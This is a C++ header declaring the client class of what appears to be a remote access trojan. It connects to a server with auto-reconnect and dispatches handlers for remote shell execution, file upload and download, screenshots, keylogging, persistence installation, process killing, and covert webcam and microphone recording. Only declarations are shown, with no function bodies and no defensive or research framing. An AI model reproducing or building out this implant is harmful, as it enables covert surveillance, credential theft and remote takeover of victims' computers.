#ifndef CLIENT_H
#define CLIENT_H

#include <string>
#include <vector>
#include <map>
#include <thread>
#include <mutex>
#include <atomic>
#include <functional>
#include <memory>

#include "../../common/src/protocol.h"
#include "../../common/src/network.h"
#include "../../common/src/utils.h"

class Client
{
private:
    std::string server_address;
    uint16_t server_port;
    std::shared_ptr<Connection> connection;
    std::atomic<bool> is_running;
    std::thread command_thread;
    std::map<uint16_t, std::function<bool(const std::vector<uint8_t> &, uint32_t)>> command_handlers;
    bool auto_reconnect;
    int reconnect_interval;

public:
    Client(const std::string &server_addr, uint16_t port = DEFAULT_PORT);
    ~Client();

    bool connect();
    void disconnect();
    bool isConnected() const;
    void setAutoReconnect(bool enable, int interval_seconds = 60);

    bool sendSystemInfo();
    bool executeCommand(uint16_t command, const std::vector<uint8_t> &payload = {});

    void start();
    void stop();

private:
    void setupCommandHandlers();
    void commandLoop();
    void attemptReconnect();

    bool handlePing(const std::vector<uint8_t> &payload, uint32_t sequence);
    bool handleShellExec(const std::vector<uint8_t> &payload, uint32_t sequence);
    bool handleFileList(const std::vector<uint8_t> &payload, uint32_t sequence);
    bool handleFileUpload(const std::vector<uint8_t> &payload, uint32_t sequence);
    bool handleFileDownload(const std::vector<uint8_t> &payload, uint32_t sequence);
    bool handleScreenshot(const std::vector<uint8_t> &payload, uint32_t sequence);
    bool handleKeylogger(const std::vector<uint8_t> &payload, uint32_t sequence);
    bool handlePersistence(const std::vector<uint8_t> &payload, uint32_t sequence);
    bool handleProcessList(const std::vector<uint8_t> &payload, uint32_t sequence);
    bool handleProcessKill(const std::vector<uint8_t> &payload, uint32_t sequence);
    bool handleWebcam(const std::vector<uint8_t> &payload, uint32_t sequence);
    bool handleMicrophone(const std::vector<uint8_t> &payload, uint32_t sequence);
    bool handleExit(const std::vector<uint8_t> &payload, uint32_t sequence);

    // Utility functions
    std::string getSystemInfo();
    std::vector<uint8_t> captureScreenshot();
    std::vector<uint8_t> captureWebcam();
    std::vector<uint8_t> recordMicrophone(int seconds);
    bool installPersistence();
    bool removePersistence();
    std::vector<uint8_t> getProcessList();
    bool killProcess(int pid);
};

#endif // CLIENT_H